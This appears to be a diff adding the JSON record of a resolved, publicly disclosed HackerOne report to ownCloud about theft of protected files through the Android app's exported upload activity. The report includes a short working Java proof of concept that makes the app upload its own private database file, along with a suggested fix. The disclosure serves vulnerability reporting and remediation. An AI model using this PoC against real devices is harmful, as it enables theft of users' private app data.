@@ -1,0 +1,168 @@
+{
+  "id": 1454002,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDU0MDAy",
+  "url": "https://hackerone.com/reports/1454002",
+  "title": "Theft of protected files on Android",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2022-01-19T12:49:28.945Z",
+  "submitted_at": "2022-01-19T12:49:29.034Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "n00b-cyborg",
+    "url": "/n00b-cyborg",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 3059,
+    "url": "https://hackerone.com/owncloud",
+    "handle": "owncloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "ownCloud",
+      "twitter_handle": "ownCloud",
+      "website": "https://www.owncloud.com",
+      "about": "ownCloud GmbH is the company behind the ownCloud Project - the most downloaded open source project for data and file sync, share and view."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-03-17T08:42:53.345Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-02-22T08:30:13.400Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "There is an issue that allows to retrieve any files from protected directory of application - ```/data/data/com.owncloud.android/*```.\nThe issue is caused by exported activity ```com.owncloud.android.ui.activity.ReceiveExternalFilesActivity``` with intent filter ```android.intent.action.SEND_MULTIPLE``` that accepts URI of files for upload. Any 3rd-party application could start this activity and upload on server any files such as database file from protected directory in context of owncloud application.\n\nTested on latest stable version of app - 2.19.\nVersion of android - 11.\n\nJava PoC:\n```Java\nStrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();\nStrictMode.setVmPolicy(builder.build());\nIntent intent = new Intent(\"android.intent.action.SEND_MULTIPLE\");\nintent.setClassName(\"com.owncloud.android\", \"com.owncloud.android.ui.activity.ReceiveExternalFilesActivity\");\nintent.setType(\"*/*\");\nintent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);\nArrayList mStreamsToUpload = new ArrayList<>();\nmStreamsToUpload.add(Uri.parse(\"file:///data/data/com.owncloud.android/databases/filelist\"));\nintent.putExtra(\"android.intent.extra.STREAM\", mStreamsToUpload);\nstartActivity(intent);\n```\n\n**Mitigation:**\nThere is valid protection for preventing reading files from directory ```/data/data/com.owncloud.android/*``` in similar intent-filter ```android.intent.action.SEND```. Copy this protection for ```android.intent.action.SEND_MULTIPLE```.\n\n## Impact\n\nPotential attacker could steal files from protected directory of application for example files of databases, cache and history of files.",
+  "bounty_amount": "50.0",
+  "formatted_bounty": "$50",
+  "weakness": {
+    "id": 57,
+    "name": "Violation of Secure Design Principles"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1584621,
+      "file_name": "before_exploit.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dux7h0l51epjn7jby8wzzbhvzq1y?response-content-disposition=attachment%3B%20filename%3D%22before_exploit.jpg%22%3B%20filename%2A%3DUTF-8%27%27before_exploit.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7G4OCRFL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T001553Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH8aCXVzLXdlc3QtMiJGMEQCIDGN6xRXkipIqeD39%2FtstUVrQkeHhl%2FxhvDuWUHEJgsgAiBcJw8vwBpE3IzuTr3fqr2M9V6SwVQHEIisgKuKMJVoWyq7BQj4%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMfc22FeItlB7fsFn%2FKo8Ffm5Vqp0OLe5pV1PeqgQWzDTuU4FqowWH1fjAMotLjDQx0AvmjSuLkx8nHIR3F9EcWNhI1buvDphOuSY3oD4T4WVLQjTUCaMjN3e%2Fv741055XG5OPXCe1oEb8eWqfcx%2Ff5jVOG7FoFGMQs25WHeUIB3rpzR%2FVVQuoRKv5KLz6lGI8wn3uquTw05jVNXa7qngHd%2FJH1eY4P9%2BGoYYpVfQmWzjROMHwa2x0sJk5QfPMqXyamTGOs5V0NSbkOtc0pXBibCpzjFV4I2WWEhj5EnzdWD8s%2FAO5UvaoYzZQ2brwSrINS9bNyuQFAwWfH0KDjjtYzt9ye0p%2FNKTecEh20UFVidMGzwuwRHWc9Cq5ycYqCUZIFmA9GbQvBknj3PSBdPZFRotUt4j8i0rMlsoAie28maE%2FXLI6q2%2BrACzFa%2B3HqG38IS95u7kjj%2BQfZA0pjGNrh3gpJQHn9GdTbc4vN4GVOZPSqV%2FFkq7ghOZQ4fzCYQRfWs9ELAyAidng9JhSn2dNMoI05u%2FM%2BbP0h3qqILA2%2Fh2gt9DdzecwEXUHoIa7f9d0jG%2BDm2aCOYZ9Hle3Faq12GA%2FG26%2BCKb9KFyODx40P%2Fz5R2pYw5v0KgRaP%2BUYb7x4dok%2B38i7vFKWjfXmYVh2p9BYr0eXnfuIkhfQSy8FLuc%2BcqsQqKEGmEuVSO0SErDAOTV2RRodc3hu1ovCoNpjY8TLQqphyfm2c1vyeXEdqCmkSX55Ia9wT3XppjXji276gS3D5RBQuScemfR5keTR5u6B5Z2T%2F3Wf066KyQOBwe9YC2RDTypy%2F12MDBpO3ubGJBYMa%2FxURNt82yFwt4cfofeiJLAfNZXk%2BfkWYPevp40d%2B0snkPba1D8FtCQwyTDD47zGBjqyAfxTAeYaM3mZJ9o9BCgJhn0d8fXS%2FO6ZTTxqrwSftYi8Jrf11R2oMKWnlWzzVoJCsIkeWYs0cxytRs7N6KE1FSSB1Y5MkbxC98vs%2BQeNI3eYXBXj0%2BUpkJLE8Q74gL1lWJo%2B5D4p7WJlG3g%2BBA%2BLW9UFTQ44c2Js2TFR9b0AJGhj5mVyEt5u%2BT%2FsuRpGhrcAkcNiKLEx7K5l36DsSOHZ4JSggc43FWLv76erQxZm%2FIqyKvo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a489186dd3d5b35fbafedd6c35cae6604e0a43326ec66bbf44201f48135a3b83",
+      "file_size": 25587,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 1584622,
+      "file_name": "after_exploit.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mx7k0s2l05roi5w0w6e4lia52mdb?response-content-disposition=attachment%3B%20filename%3D%22after_exploit.jpg%22%3B%20filename%2A%3DUTF-8%27%27after_exploit.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7G4OCRFL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T001553Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH8aCXVzLXdlc3QtMiJGMEQCIDGN6xRXkipIqeD39%2FtstUVrQkeHhl%2FxhvDuWUHEJgsgAiBcJw8vwBpE3IzuTr3fqr2M9V6SwVQHEIisgKuKMJVoWyq7BQj4%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMfc22FeItlB7fsFn%2FKo8Ffm5Vqp0OLe5pV1PeqgQWzDTuU4FqowWH1fjAMotLjDQx0AvmjSuLkx8nHIR3F9EcWNhI1buvDphOuSY3oD4T4WVLQjTUCaMjN3e%2Fv741055XG5OPXCe1oEb8eWqfcx%2Ff5jVOG7FoFGMQs25WHeUIB3rpzR%2FVVQuoRKv5KLz6lGI8wn3uquTw05jVNXa7qngHd%2FJH1eY4P9%2BGoYYpVfQmWzjROMHwa2x0sJk5QfPMqXyamTGOs5V0NSbkOtc0pXBibCpzjFV4I2WWEhj5EnzdWD8s%2FAO5UvaoYzZQ2brwSrINS9bNyuQFAwWfH0KDjjtYzt9ye0p%2FNKTecEh20UFVidMGzwuwRHWc9Cq5ycYqCUZIFmA9GbQvBknj3PSBdPZFRotUt4j8i0rMlsoAie28maE%2FXLI6q2%2BrACzFa%2B3HqG38IS95u7kjj%2BQfZA0pjGNrh3gpJQHn9GdTbc4vN4GVOZPSqV%2FFkq7ghOZQ4fzCYQRfWs9ELAyAidng9JhSn2dNMoI05u%2FM%2BbP0h3qqILA2%2Fh2gt9DdzecwEXUHoIa7f9d0jG%2BDm2aCOYZ9Hle3Faq12GA%2FG26%2BCKb9KFyODx40P%2Fz5R2pYw5v0KgRaP%2BUYb7x4dok%2B38i7vFKWjfXmYVh2p9BYr0eXnfuIkhfQSy8FLuc%2BcqsQqKEGmEuVSO0SErDAOTV2RRodc3hu1ovCoNpjY8TLQqphyfm2c1vyeXEdqCmkSX55Ia9wT3XppjXji276gS3D5RBQuScemfR5keTR5u6B5Z2T%2F3Wf066KyQOBwe9YC2RDTypy%2F12MDBpO3ubGJBYMa%2FxURNt82yFwt4cfofeiJLAfNZXk%2BfkWYPevp40d%2B0snkPba1D8FtCQwyTDD47zGBjqyAfxTAeYaM3mZJ9o9BCgJhn0d8fXS%2FO6ZTTxqrwSftYi8Jrf11R2oMKWnlWzzVoJCsIkeWYs0cxytRs7N6KE1FSSB1Y5MkbxC98vs%2BQeNI3eYXBXj0%2BUpkJLE8Q74gL1lWJo%2B5D4p7WJlG3g%2BBA%2BLW9UFTQ44c2Js2TFR9b0AJGhj5mVyEt5u%2BT%2FsuRpGhrcAkcNiKLEx7K5l36DsSOHZ4JSggc43FWLv76erQxZm%2FIqyKvo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5db2166d11fd0074b5c947d9b4145611779b7f2ab91e9cf139b68c772e9f2def",
+      "file_size": 28486,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 1584623,
+      "file_name": "database_theft.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fsxxnmzmi3r4xqvn4r3y1lz3v3s6?response-content-disposition=attachment%3B%20filename%3D%22database_theft.png%22%3B%20filename%2A%3DUTF-8%27%27database_theft.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7G4OCRFL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T001553Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH8aCXVzLXdlc3QtMiJGMEQCIDGN6xRXkipIqeD39%2FtstUVrQkeHhl%2FxhvDuWUHEJgsgAiBcJw8vwBpE3IzuTr3fqr2M9V6SwVQHEIisgKuKMJVoWyq7BQj4%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMfc22FeItlB7fsFn%2FKo8Ffm5Vqp0OLe5pV1PeqgQWzDTuU4FqowWH1fjAMotLjDQx0AvmjSuLkx8nHIR3F9EcWNhI1buvDphOuSY3oD4T4WVLQjTUCaMjN3e%2Fv741055XG5OPXCe1oEb8eWqfcx%2Ff5jVOG7FoFGMQs25WHeUIB3rpzR%2FVVQuoRKv5KLz6lGI8wn3uquTw05jVNXa7qngHd%2FJH1eY4P9%2BGoYYpVfQmWzjROMHwa2x0sJk5QfPMqXyamTGOs5V0NSbkOtc0pXBibCpzjFV4I2WWEhj5EnzdWD8s%2FAO5UvaoYzZQ2brwSrINS9bNyuQFAwWfH0KDjjtYzt9ye0p%2FNKTecEh20UFVidMGzwuwRHWc9Cq5ycYqCUZIFmA9GbQvBknj3PSBdPZFRotUt4j8i0rMlsoAie28maE%2FXLI6q2%2BrACzFa%2B3HqG38IS95u7kjj%2BQfZA0pjGNrh3gpJQHn9GdTbc4vN4GVOZPSqV%2FFkq7ghOZQ4fzCYQRfWs9ELAyAidng9JhSn2dNMoI05u%2FM%2BbP0h3qqILA2%2Fh2gt9DdzecwEXUHoIa7f9d0jG%2BDm2aCOYZ9Hle3Faq12GA%2FG26%2BCKb9KFyODx40P%2Fz5R2pYw5v0KgRaP%2BUYb7x4dok%2B38i7vFKWjfXmYVh2p9BYr0eXnfuIkhfQSy8FLuc%2BcqsQqKEGmEuVSO0SErDAOTV2RRodc3hu1ovCoNpjY8TLQqphyfm2c1vyeXEdqCmkSX55Ia9wT3XppjXji276gS3D5RBQuScemfR5keTR5u6B5Z2T%2F3Wf066KyQOBwe9YC2RDTypy%2F12MDBpO3ubGJBYMa%2FxURNt82yFwt4cfofeiJLAfNZXk%2BfkWYPevp40d%2B0snkPba1D8FtCQwyTDD47zGBjqyAfxTAeYaM3mZJ9o9BCgJhn0d8fXS%2FO6ZTTxqrwSftYi8Jrf11R2oMKWnlWzzVoJCsIkeWYs0cxytRs7N6KE1FSSB1Y5MkbxC98vs%2BQeNI3eYXBXj0%2BUpkJLE8Q74gL1lWJo%2B5D4p7WJlG3g%2BBA%2BLW9UFTQ44c2Js2TFR9b0AJGhj5mVyEt5u%2BT%2FsuRpGhrcAkcNiKLEx7K5l36DsSOHZ4JSggc43FWLv76erQxZm%2FIqyKvo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9168472c9d3d0b3b11ef9c3d51ae42cab338ee8124c1ccfbeb153c3f74a1a302",
+      "file_size": 521333,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1584626,
+      "file_name": "owncl.apk",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/38vn6txarqpbgd4h2bpcz5637lq5?response-content-disposition=attachment%3B%20filename%3D%22owncl.apk%22%3B%20filename%2A%3DUTF-8%27%27owncl.apk&response-content-type=application%2Fvnd.android.package-archive&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7G4OCRFL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T001553Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH8aCXVzLXdlc3QtMiJGMEQCIDGN6xRXkipIqeD39%2FtstUVrQkeHhl%2FxhvDuWUHEJgsgAiBcJw8vwBpE3IzuTr3fqr2M9V6SwVQHEIisgKuKMJVoWyq7BQj4%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMfc22FeItlB7fsFn%2FKo8Ffm5Vqp0OLe5pV1PeqgQWzDTuU4FqowWH1fjAMotLjDQx0AvmjSuLkx8nHIR3F9EcWNhI1buvDphOuSY3oD4T4WVLQjTUCaMjN3e%2Fv741055XG5OPXCe1oEb8eWqfcx%2Ff5jVOG7FoFGMQs25WHeUIB3rpzR%2FVVQuoRKv5KLz6lGI8wn3uquTw05jVNXa7qngHd%2FJH1eY4P9%2BGoYYpVfQmWzjROMHwa2x0sJk5QfPMqXyamTGOs5V0NSbkOtc0pXBibCpzjFV4I2WWEhj5EnzdWD8s%2FAO5UvaoYzZQ2brwSrINS9bNyuQFAwWfH0KDjjtYzt9ye0p%2FNKTecEh20UFVidMGzwuwRHWc9Cq5ycYqCUZIFmA9GbQvBknj3PSBdPZFRotUt4j8i0rMlsoAie28maE%2FXLI6q2%2BrACzFa%2B3HqG38IS95u7kjj%2BQfZA0pjGNrh3gpJQHn9GdTbc4vN4GVOZPSqV%2FFkq7ghOZQ4fzCYQRfWs9ELAyAidng9JhSn2dNMoI05u%2FM%2BbP0h3qqILA2%2Fh2gt9DdzecwEXUHoIa7f9d0jG%2BDm2aCOYZ9Hle3Faq12GA%2FG26%2BCKb9KFyODx40P%2Fz5R2pYw5v0KgRaP%2BUYb7x4dok%2B38i7vFKWjfXmYVh2p9BYr0eXnfuIkhfQSy8FLuc%2BcqsQqKEGmEuVSO0SErDAOTV2RRodc3hu1ovCoNpjY8TLQqphyfm2c1vyeXEdqCmkSX55Ia9wT3XppjXji276gS3D5RBQuScemfR5keTR5u6B5Z2T%2F3Wf066KyQOBwe9YC2RDTypy%2F12MDBpO3ubGJBYMa%2FxURNt82yFwt4cfofeiJLAfNZXk%2BfkWYPevp40d%2B0snkPba1D8FtCQwyTDD47zGBjqyAfxTAeYaM3mZJ9o9BCgJhn0d8fXS%2FO6ZTTxqrwSftYi8Jrf11R2oMKWnlWzzVoJCsIkeWYs0cxytRs7N6KE1FSSB1Y5MkbxC98vs%2BQeNI3eYXBXj0%2BUpkJLE8Q74gL1lWJo%2B5D4p7WJlG3g%2BBA%2BLW9UFTQ44c2Js2TFR9b0AJGhj5mVyEt5u%2BT%2FsuRpGhrcAkcNiKLEx7K5l36DsSOHZ4JSggc43FWLv76erQxZm%2FIqyKvo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ff4baa28397a8345eb1ef0d6debea1fb1957cf5acf166160740bd7cc964cf808",
+      "file_size": 1882487,
+      "type": "application/vnd.android.package-archive",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-03-24T08:30:13.499Z",
+  "allow_singular_disclosure_after": -110303139.78966437,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "alp",
+    "shell_c0de",
+    "0xnikhilk",
+    "nem0x00",
+    "f1ras",
+    "shivammusic",
+    "malik_x00",
+    "vibonacci_",
+    "prajeshkumarg",
+    "moumou54",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 1.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 469,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.owncloud.android",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
